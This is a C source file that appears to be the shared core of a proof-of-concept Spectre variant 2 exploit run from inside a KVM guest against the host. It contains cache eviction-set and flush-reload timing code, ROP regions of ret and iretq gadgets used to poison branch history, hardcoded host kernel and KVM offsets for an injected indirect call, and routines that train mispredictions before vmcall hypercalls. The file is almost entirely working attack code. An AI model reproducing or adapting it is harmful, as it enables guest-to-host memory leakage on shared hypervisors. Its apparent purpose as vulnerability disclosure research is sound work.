#define _GNU_SOURCE
#include <ctype.h>
#include <errno.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/user.h>
#include <err.h>
#include <stdio.h>
#include <limits.h>
#include <stdbool.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdint.h>
#include <math.h>
#include <sys/io.h>
#include <sched.h>

/* number of sets in the L3 cache per fixed alignment relative to 4K page boundary,
 * ignoring the split across cores
 */
#define SETS_PER_IN_PAGE_OFFSET_MERGEDCORES 32
/* number of cores over which the L3 cache is split */
#define CORE_SPLIT_FACTOR 6
/* associativity of the L3 cache; assumes a Haswell Xeon E5-1650 v3 */
#define CACHE_ASSOCIATIVITY /*16*/20
#define EVICTION_SET_SIZE /*26*/30
/* effective number of sets */
#define SETS_PER_IN_PAGE_OFFSET (SETS_PER_IN_PAGE_OFFSET_MERGEDCORES * CORE_SPLIT_FACTOR)
/* cacheline size in bytes */
#define LINE_SIZE 64
/* number of pages in which to search for colliding cachelines */
#define NPAGES 25600
#define LINES_PER_PAGE (PAGE_SIZE / LINE_SIZE)
#define IN_PAGE_CACHELINE_IDX 10 /* 0x2b0 / 64 */

#define ARRSIZE(x) (sizeof(x) / sizeof((x)[0]))

#define PIPELINE_FLUSH_ASM(uniq)                  \
  "mov %%rsp, %%r15\n\t"                          \
  "mov %%ss, %%r14\n\t"                           \
  "push %%r14\n\t"                                \
  "push %%r15\n\t"                                \
  "pushf\n\t"                                     \
  "mov %%cs, %%r15\n\t"                           \
  "push %%r15\n\t"                                \
  "lea post_iretq_%=_" #uniq "(%%rip), %%r15\n\t" \
  "push %%r15\n\t"                                \
  "iretq\n\t"                                     \
  "post_iretq_%=_" #uniq ":\n\t"
#define pipeline_flush() asm volatile (   \
  PIPELINE_FLUSH_ASM(a)                   \
  : /*out*/ : /*in*/ : "r14", "r15", "cc" \
)
#define rdtscp() ({unsigned int result; asm volatile("rdtscp":"=a"(result)::"rdx","rcx","memory"); result;})
#define clflush(addr) asm volatile("clflush (%0)"::"r"(addr):"memory")
#define read_byte(addr) asm volatile("mov (%0), %%r11"::"r"(addr):"r11","memory")


struct cacheline {
  union {
    char pad[LINE_SIZE];
    struct {
      /* asm-shared */
      struct cacheline *next;
      unsigned int access_time;

      /* C-private */
      unsigned int set_id;
      unsigned int hot_count;
      bool picked;
      unsigned int hot_count_l2;
      unsigned int uniq;
    };
  };
};

char *cur_time(void) {
  static char res[100];
  time_t t = time(NULL);
  strftime(res, sizeof(res), "[%T]", gmtime(&t));
  return res;
}

/* Load a function from a file, aligned so that cachelines with in-page index
 * IN_PAGE_CACHELINE_IDX are as far away as possible (in virtual address space).
 */
void *load_function_noalias(char *path) {
  int fd = open(path, O_RDONLY);
  if (fd == -1)
    err(1, "open function file");
  struct stat st;
  if (fstat(fd, &st))
    err(1, "stat function file");
  if (st.st_size > 0x700)
    errx(1, "that function looks a bit big");
  char *pages = mmap(NULL, 0x7000, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
  if (pages == MAP_FAILED)
    err(1, "mmap");
  char *code_page = pages + 0x3000;
  if (mprotect(code_page, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC))
    err(1, "mprotect");
  char *code;
  if (64 * IN_PAGE_CACHELINE_IDX + 32 < 0x800) {
    code = code_page + 0x1000 - st.st_size;
  } else {
    code = code_page;
  }
  if (read(fd, code, st.st_size) != st.st_size)
    err(1, "read");
  return code;
}

unsigned long kvm_intel_load_address = 0x800000000badbeef;
unsigned long kvm_load_address       = 0x800000000badbeef;
unsigned long kernel_load_address    = 0x800000000badbeef;
unsigned long page_offset            = 0x800000000badbeef;

#define R8_LOAD_ADDRESS (kernel_load_address + 0x2c9d3)
#define PHYS_LOAD_ADDRESS (kernel_load_address + 0xa9def)
#define PAGE_OFFSET_BASE_ADDRESS (kernel_load_address + 0xc317e8)
#define RSI_CONTROLLED_CALL_ADDRESS (kernel_load_address + 0x514edd)
#define BPF_PROG_RUN_ADDRESS (kernel_load_address + 0x15ab60)
#define PER_CPU_OFFSET_ADDRESS (kernel_load_address + 0xa6b3c0)
#define INDIR_CALL_SOURCE_IN_PAGE_OFFSET 0x394 /* call [rax+0x2b0] at 0x1f390 */
#define INDIR_CALL_SOURCE_IN_PAGE_OFFSET_STR "0x394"
#define INDIR_CALL_SOURCE_OFFSET 0x1f390
#define INDIR_CALL_DEST_OFFSET 0x4a0
#define BOUNCE_PAGE ((uint8_t*)0xffffffff8d000000)
#define VCPU_IOCTL_CALLER_OFFSET 0x215fcd
#define VCPU_IOCTL_OFFSET 0x51a0

unsigned char *rop_areas_alloc;
unsigned char *ret_area;    /* size 0x100000, alignment 0x100000 */
unsigned char *iret_area_a; /* size 0x40, alignment 0x40 */
unsigned char *iret_area_b; /* size 0x41, alignment 0x40 */

struct jump {
  unsigned long src; /* address of last byte of jump instruction */
  unsigned long dst; /* target address */
};

void (*do_flushing_and_time)(struct cacheline *head, struct cacheline *evictme);

void write_ulong_to_file(const char *fname, unsigned long value) {
  char fpath[200];
  sprintf(fpath, "/dev/shm/%s", fname);
  FILE *out = fopen(fpath, "w");
  if (!out)
    err(1, "unable to open result file");
  fprintf(out, "0x%lx\n", value);
  fclose(out);
}
unsigned long read_ulong_from_file(const char *fname, bool required, unsigned long default_value) {
  char fpath[200];
  sprintf(fpath, "/dev/shm/%s", fname);
  int fd = open(fpath, O_RDONLY);
  if (fd == -1) {
    if (required)
      err(1, "unable to read %s", fname);
    return default_value;
  }
  char buf[1000];
  errno = 0;
  int size = read(fd, buf, 1000);
  if (size <= 0)
    err(1, "read from %s", fname);
  buf[size] = 0;
  close(fd);
  return strtoull(buf, NULL, 0);
}

void common_init(void) {
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);

  do_flushing_and_time = load_function_noalias("do_flushing_and_time2.bin");

  /* set up ROP area with ret and iretq instructions for loading arbitrary values into the BHB */
  rop_areas_alloc = mmap(NULL, 0x200000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
  if (rop_areas_alloc == MAP_FAILED)
    err(1, "mmap failed");
  ret_area = (unsigned char *)( (((unsigned long)rop_areas_alloc)+0xff000UL) & ~0xff000UL );
  iret_area_a = ret_area + 0x100000;
  iret_area_b = iret_area_a + 0x40;
  memset(ret_area, 0xc3, 0x100000);
  for (int i=0; i<0x20; i++) {
    iret_area_a[2*i+0] = 0x48;
    iret_area_a[2*i+1] = 0xcf;
    iret_area_b[2*i+1] = 0x48;
    iret_area_b[2*i+2] = 0xcf;
  }

  kvm_intel_load_address = read_ulong_from_file("kvm_intel_load_address", false, 0x800000000badbeef);
  kernel_load_address = read_ulong_from_file("host_vmlinux_load_address", false, 0x800000000badbeef);
  kvm_load_address = read_ulong_from_file("host_kvm_load_address", false, 0x800000000badbeef);
  page_offset = read_ulong_from_file("page_offset", false, 0x800000000badbeef);
}

#define TMOH_ADD_IRETQ_FRAME(rip,rsp) {   \
  rop_stack_wp[0] = (unsigned long)(rip); \
  rop_stack_wp[1] = cs;                   \
  rop_stack_wp[2] = eflags;               \
  rop_stack_wp[3] = (rsp);                \
  rop_stack_wp[4] = ss;                   \
  rop_stack_wp += 5;                      \
}
#define TMOH_ADD_IRETQ_RET_FRAME(rip)   \
  TMOH_ADD_IRETQ_FRAME((rip), (unsigned long)(rop_stack_wp + 5))

unsigned int train_mispredict_or_hypercall(unsigned long r8val, unsigned long r9val, unsigned long call_target) {
  assert(rop_areas_alloc != NULL && rop_areas_alloc != MAP_FAILED);

  unsigned long call_target_area[0x4000];
  unsigned long *call_target_indir = call_target_area + 0x2000;
  *call_target_indir = call_target;

  extern void train_mispredict_or_hypercall__do_hypercall(void);
  extern void train_mispredict_or_hypercall__do_fake(void);
  void *iret_target;
  if (r8val)
    iret_target = train_mispredict_or_hypercall__do_hypercall;
  else
    iret_target = train_mispredict_or_hypercall__do_fake;

  unsigned long rop_stack[0x4000];
  unsigned long *rop_stack_wp = rop_stack + 0x2000;
  unsigned long *rsp_store_ptr;

  unsigned long cs, ss, eflags;
  asm volatile("mov %%ss, %0":"=r"(ss));
  asm volatile("mov %%cs, %0":"=r"(cs));
  asm volatile("pushf\n\tpop %0":"=r"(eflags)); /* some random flags state */

  struct jump jump_pattern[] = {
    // vmx_vcpu_run -> vmx_complete_atomic_exit_constprop_88
    { .src = kvm_intel_load_address + 0xfcbd, .dst = kvm_intel_load_address + 0x4720 }, 
    // vmx_vcpu_run <- vmx_complete_atomic_exit_constprop_88
    { .src = kvm_intel_load_address + 0x4734, .dst = kvm_intel_load_address + 0xfcbe },
    // vmx_vcpu_run -> vmx_recover_nmi_blocking
    { .src = kvm_intel_load_address + 0xfcc5, .dst = kvm_intel_load_address + 0x20a0 },
    { .src = kvm_intel_load_address + 0x20b6, .dst = kvm_intel_load_address + 0x20f1 },
    // vmx_vcpu_run <- vmx_recover_nmi_blocking
    { .src = kvm_intel_load_address + 0x20f2, .dst = kvm_intel_load_address + 0xfcc6 },
    // vmx_vcpu_run -- vmx_complete_interrupts
    { .src = kvm_intel_load_address + 0xfcdb, .dst = kvm_intel_load_address + 0x3940 },
    // vmx_complete_interrupts -- __vmx_complete_interrupts
    { .src = kvm_intel_load_address + 0x3959, .dst = kvm_intel_load_address + 0x3830 },
    // kvm_arch_vcpu_ioctl_run <- __vmx_complete_interrupts
    { .src = kvm_intel_load_address + 0x384f, .dst = kvm_load_address + 0x1f2e3 },
    { .src = kvm_load_address + 0x1f325, .dst = kvm_load_address + 0x1f344 },
    { .src = kvm_load_address + 0x1f36f, .dst = kvm_load_address + 0x1f37c }
  };


  for (int i=0; i<32; i++) {
    TMOH_ADD_IRETQ_RET_FRAME(ret_area)
    *(rop_stack_wp++) = (unsigned long)iret_area_a;
  }
  if (r8val == 0 || r8val == 1) {
    for (int i=0; i<sizeof(jump_pattern)/sizeof(jump_pattern[0]); i++) {
      TMOH_ADD_IRETQ_RET_FRAME(ret_area + (jump_pattern[i].src & 0xfffffUL))
      *(rop_stack_wp++) = (unsigned long)(((jump_pattern[i].dst&1)?iret_area_b:iret_area_a) +
                          (jump_pattern[i].dst & 0x3f));
    }
  }

  rsp_store_ptr = rop_stack_wp + 3;
  TMOH_ADD_IRETQ_FRAME(iret_target, 0x0000deadbeef0000)

  unsigned int t1 = 0, t2 = 0;
  asm volatile(
    // for return
    "lea train_mispredict_or_hypercall__end(%%rip), %%r8\n\t"
    "push %%r8\n\t"

    "mov %[r8val], %%r8\n\t"
    "mov %[r9val], %%r9\n\t"

    "mov %%rsp, (%[rsp_store_ptr])\n\t"
    "mov %[rop_stack], %%rsp\n\t"
    "iretq\n\t"

    "train_mispredict_or_hypercall__do_hypercall:\n\t"
    "rdtscp\n\t"
    "mov %%eax, %[t1]\n\t"
    "mov $0xfffff, %%rax\n\t"
    "vmcall\n\t"
    "rdtsc\n\t"
    "mov %%eax, %[t2]\n\t"
    "ret\n\t"

    ".align 0x1000, 0x90\n\t"
    ".fill " INDIR_CALL_SOURCE_IN_PAGE_OFFSET_STR ", 1, 0x90\n\t"
    "train_mispredict_or_hypercall__do_fake:\n\t"
    "call *(%[call_target_indir])\n\t"
    "ret\n\t"

    "train_mispredict_or_hypercall__end:\n\t"
  : //out
    [t1] "=&r"(t1),
    [t2] "=&r"(t2)
  : //in
    [rsp_store_ptr] "r"(rsp_store_ptr),
    [rop_stack] "r"(rop_stack + 0x2000),
    [call_target_indir] "r"(call_target_indir),
    [r8val] "r"(r8val),
    [r9val] "r"(r9val)
  : //clobber
    "r15","r14","memory","cc","rax","r8","r9","r10"
  );
  return t2-t1;
}

unsigned int train_mispredict_and_hypercall(unsigned long r8val, unsigned long r9val, unsigned long load_target) {
  train_mispredict_or_hypercall(0, 0, load_target);
  train_mispredict_or_hypercall(0, 0, load_target);
  return train_mispredict_or_hypercall(r8val, r9val, load_target);
}


// for debugging purposes, won't work on a production system.
// map guest-virtual address to host-virtual address using cheat hypercall.
unsigned long get_virtaddr_cheaty(unsigned long vaddr) {
  /* cheat hypercall */
  unsigned long virtaddr;
  asm volatile(
    "mov $0x13370002, %%rax\n\t"
    "vmcall"
  : "=a"(virtaddr) : "D"(vaddr) : "cc");
  return virtaddr;
}

// for debugging purposes, won't work on a production system.
// map guest-virtual address to host-physical address using cheat hypercall.
unsigned long get_physaddr_cheaty(unsigned long vaddr) {
  /* cheat hypercall */
  unsigned long physaddr;
  asm volatile(
    "mov $0x13370001, %%rax\n\t"
    "vmcall"
  : "=a"(physaddr) : "D"(vaddr) : "cc");
  return physaddr;
}

struct page {
  union {
    struct {
      int dedup_ctr;
      unsigned long host_addr;
      unsigned long phys_addr;
      char data[1];
    };
    unsigned char full_page[0x1000];
  };
};

#define BATCH_FACTOR 100
int get_lines_with_set_id_cm(struct cacheline **out,
        struct cacheline *cachelines, unsigned int set_id, int limit) {
  *out = NULL;
  struct cacheline *first_out = NULL;
  int res = 0;
  for (int i=0; i<NPAGES; i++) {
    struct cacheline *line = cachelines + i * LINES_PER_PAGE + IN_PAGE_CACHELINE_IDX;
    if (line->set_id == set_id) {
      if (first_out == NULL)
        first_out = line;
      line->next = *out;
      *out = line;
      res++;
      if (res == limit)
        goto exit;
    }
  }
exit:;
  if (first_out != NULL)
    first_out->next = *out;
  return res;
}

struct page *get_shared_page(void) {
  int shared_pages_area_fd = open("/dev/shm/shared_pages", O_RDWR);
  if (shared_pages_area_fd == -1)
    err(1, "open shared area file");
  struct page *shared_pages = mmap(NULL, BATCH_FACTOR*0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, shared_pages_area_fd, 0);
  if (shared_pages == MAP_FAILED)
    err(1, "mmap");

  return shared_pages + read_ulong_from_file("selected_page", true, 0);
}

struct cacheline *map_cachelines(void) {
  int cachelines_fd = open("/dev/shm/cachelines", O_RDWR);
  if (cachelines_fd == -1)
    err(1, "open cachelines files");
  struct cacheline *cachelines = mmap(NULL, NPAGES*PAGE_SIZE, PROT_READ|PROT_WRITE,
          MAP_SHARED|MAP_POPULATE, cachelines_fd, 0);
  if (cachelines == MAP_FAILED)
    err(1, "mmap");
  close(cachelines_fd);
  return cachelines;
}

struct cacheline *get_selected_eviction_set(void) {
  struct cacheline *cachelines = map_cachelines();
  int selected_set_id = read_ulong_from_file("selected_set", true, 0);
  struct cacheline *result;
  get_lines_with_set_id_cm(&result, cachelines, selected_set_id, EVICTION_SET_SIZE);
  return result;
}

// ================ HOT/COLD ================
unsigned int hot_cold_limit;

bool is_hot_diff(unsigned int diff) {
  return diff < hot_cold_limit;
}

bool is_hot(void *ptr) {
  pipeline_flush();
  unsigned int t1 = rdtscp();
  read_byte(ptr);
  unsigned int t2 = rdtscp();
  pipeline_flush();
  return (t2 - t1) < hot_cold_limit;
}

void hot_cold_init(void) {
  for (int i=0; i<10000000; i++) asm volatile("");
  char cacheline_area[10000];
  char *cacheline = cacheline_area + 5000;

  unsigned int cold_min = UINT_MAX;
  for (int i=0; i<1000000; i++) {
    pipeline_flush();
    clflush(cacheline);

    pipeline_flush();
    unsigned int t1 = rdtscp();
    read_byte(cacheline);
    unsigned int t2 = rdtscp();
    pipeline_flush();
    unsigned int delay = t2 - t1;

    if (delay < cold_min) cold_min = delay;
  }
  printf("%s cold min: %u\n", cur_time(), cold_min);

  long hot_sum = 0;
  int hot_sum_count = 0;
  for (int i=0; i<1000000; i++) {
    pipeline_flush();
    unsigned int t1 = rdtscp();
    read_byte(cacheline);
    unsigned int t2 = rdtscp();
    pipeline_flush();
    unsigned int delay = t2 - t1;

    if (delay < cold_min * 4) {
      hot_sum += delay;
      hot_sum_count++;
    }
  }
  int hot_avg = hot_sum / hot_sum_count;
  printf("%s hot avg: %ld/%d = %d\n", cur_time(), hot_sum, hot_sum_count, hot_avg);
  hot_cold_limit = (2*cold_min + hot_avg) / 3;
  printf("%s hot_cold_limit: %u\n", cur_time(), hot_cold_limit);

  // TEST HOT/COLD
  int false_hot = 0, false_cold = 0;
  pipeline_flush();
  for (int i=0; i<1000000; i++) {
    clflush(cacheline);
    if (is_hot(cacheline))
      false_hot++;
  }
  pipeline_flush();
  read_byte(cacheline);
  for (int i=0; i<1000000; i++) {
    if (!is_hot(cacheline))
      false_cold++;
  }
  printf("%s false hot: %d, false cold: %d (each in 1000000)\n", cur_time(), false_hot, false_cold);
}
// ==========================================

// Check whether `addr` seems to have a BTB-aliasing address in the range [start,end).
bool has_alias_in_range(unsigned long addr, unsigned long start, unsigned long end) {
  // start at 1, don't test against self
  for (int i=1; i<0x100; i++) {
    unsigned long addr_ = addr ^ (i<<13) ^ (i<<22);
    if (addr_ >= start && addr_ < end) return true;
  }
  return false;
}

/* poor man's branch history buffer randomizer */
#define CRAPPY_BHB_RANDOMIZE \
  asm volatile(              \
    "test $0x1, %[foo]\n\tjz 1f\n\tnop\n\t1:\n\t" \
    "test $0x2, %[foo]\n\tjz 1f\n\tnop\n\t1:\n\t" \
    "test $0x4, %[foo]\n\tjz 1f\n\tnop\n\t1:\n\t" \
    "test $0x8, %[foo]\n\tjz 1f\n\tnop\n\t1:\n\t" \
    "test $0x10, %[foo]\n\tjz 1f\n\tnop\n\t1:\n\t" \
    "test $0x20, %[foo]\n\tjz 1f\n\tnop\n\t1:\n\t" \
    "test $0x40, %[foo]\n\tjz 1f\n\tnop\n\t1:\n\t" \
    "test $0x80, %[foo]\n\tjz 1f\n\tnop\n\t1:\n\t" \
    "test $0x100, %[foo]\n\tjz 1f\n\tnop\n\t1:\n\t" \
    "test $0x200, %[foo]\n\tjz 1f\n\tnop\n\t1:\n\t" \
    "test $0x400, %[foo]\n\tjz 1f\n\tnop\n\t1:\n\t" \
    "test $0x800, %[foo]\n\tjz 1f\n\tnop\n\t1:\n\t" \
    "test $0x1000, %[foo]\n\tjz 1f\n\tnop\n\t1:\n\t" \
    "test $0x2000, %[foo]\n\tjz 1f\n\tnop\n\t1:\n\t" \
    "test $0x4000, %[foo]\n\tjz 1f\n\tnop\n\t1:\n\t" \
    "test $0x8000, %[foo]\n\tjz 1f\n\tnop\n\t1:\n\t" \
    "test $0x10000, %[foo]\n\tjz 1f\n\tnop\n\t1:\n\t" \
    "test $0x20000, %[foo]\n\tjz 1f\n\tnop\n\t1:\n\t" \
    "test $0x40000, %[foo]\n\tjz 1f\n\tnop\n\t1:\n\t" \
    "test $0x80000, %[foo]\n\tjz 1f\n\tnop\n\t1:\n\t" \
    "test $0x100000, %[foo]\n\tjz 1f\n\tnop\n\t1:\n\t" \
    "test $0x200000, %[foo]\n\tjz 1f\n\tnop\n\t1:\n\t" \
    "test $0x400000, %[foo]\n\tjz 1f\n\tnop\n\t1:\n\t" \
    "test $0x800000, %[foo]\n\tjz 1f\n\tnop\n\t1:\n\t" \
    "test $0x1000000, %[foo]\n\tjz 1f\n\tnop\n\t1:\n\t" \
    "test $0x2000000, %[foo]\n\tjz 1f\n\tnop\n\t1:\n\t" \
    "test $0x4000000, %[foo]\n\tjz 1f\n\tnop\n\t1:\n\t" \
    "test $0x8000000, %[foo]\n\tjz 1f\n\tnop\n\t1:\n\t" \
  :/*out*/                            \
  :/*in*/                             \
    [foo] "r"((unsigned int)random()) \
  :/*clobber*/                        \
    "cc","memory"                     \
  );

/* Read from the status register IO port of COM1. This is
 * useful because COM1 is emulated by QEMU, so during the
 * "in" instruction, the host returns from the KVM_RUN ioctl,
 * QEMU runs for a bit, QEMU calls the KVM_RUN ioctl again,
 * and control flow goes back here through vmlinux->kvm->kvm_intel.
 * Therefore, BTB entries will be created for the vmlinux->kvm
 * `->unlocked_ioctl(...)` call.
 */
#define TRIP_THROUGH_QEMU                      \
  asm volatile(                                \
    "xor %%edx, %%edx\n\t"                     \
    /* 0x3f8 + 5; COM1 line status register */ \
    "mov $0x3fd, %%dx\n\t"                     \
    "in %%dx, %%al\n\t"                        \
  :/*out*/                                     \
  :/*in*/                                      \
  :/*clobber*/                                 \
    "rax","rdx"                                \
  );

